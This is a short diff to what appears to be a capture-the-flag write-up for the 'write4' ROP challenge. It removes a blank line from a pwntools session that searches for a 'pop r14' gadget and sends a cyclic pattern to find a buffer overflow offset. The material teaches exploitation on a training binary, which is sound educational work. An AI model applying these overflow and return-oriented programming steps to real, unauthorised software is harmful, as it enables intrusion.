@@ -90,7 +90,6 @@ $ ROPgadget --binary write4 | grep "pop r14"
 ```yaml
 $ python3 -q
 >>> from pwn import *
->>>
 >>> p = process("./write4")
 [+] Starting local process './write4': pid 1891
 >>> p.sendline(cyclic(400, n=8))
